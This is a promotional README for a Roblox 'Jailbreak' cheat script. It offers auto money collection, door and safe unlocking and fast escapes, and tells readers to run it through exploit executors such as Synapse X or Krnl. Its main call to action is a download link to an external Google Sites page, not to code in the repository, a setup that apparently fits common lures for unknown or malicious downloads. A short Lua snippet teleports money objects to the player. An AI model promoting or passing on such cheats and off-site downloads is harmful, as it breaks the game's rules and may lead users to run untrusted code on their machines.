# 🚓 Roblox Jailbreak Script 🚓

**⬇️ [Download Script Here](https://sites.google.com/view/nexol) ⬇️**

Welcome to the **Roblox Jailbreak Script** repository — your ultimate tool to enhance and automate gameplay in *Jailbreak*!  
Experience seamless control, fast escapes, and effortless money collection with this powerful script.

---

## ✨ Features

| Feature                     | Description                               |
|-----------------------------|-------------------------------------------|
| 💰 Automatic Money Collection | Collect cash effortlessly while you play |
| 🚪 Auto Door & Safe Unlock   | Instantly open doors and safes            |
| 🏃 Fast Jailbreak Escape     | Get out of prison in seconds               |
| 🔔 Event Notifications       | Stay updated with in-game alerts           |
| 🎮 Hotkey Support           | Control script features with customizable keys |

---

## ⚙️ Installation

1. Download or clone this repository  
2. Launch **Roblox** and join the *Jailbreak* game  
3. Open your preferred exploit/executor (e.g., Synapse X, Krnl)  
4. Paste the script into the executor and run it  

---

## 🚀 Usage

- Run the script **while in-game**  
- Follow on-screen prompts or use **hotkeys** for quick actions  
- Customize settings in the configuration file (if included) for a tailored experience  

---

## 📜 Script Example

```lua
-- Roblox Jailbreak Auto Money Collection Script Example

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local RunService = game:GetService("RunService")

local function collectMoney()
    for _, money in pairs(workspace:GetChildren()) do
        if money.Name == "Money" and money:IsA("Part") then
            money.CFrame = player.Character.HumanoidRootPart.CFrame
        end
    end
end

RunService.Heartbeat:Connect(function()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        collectMoney()
    end
end)
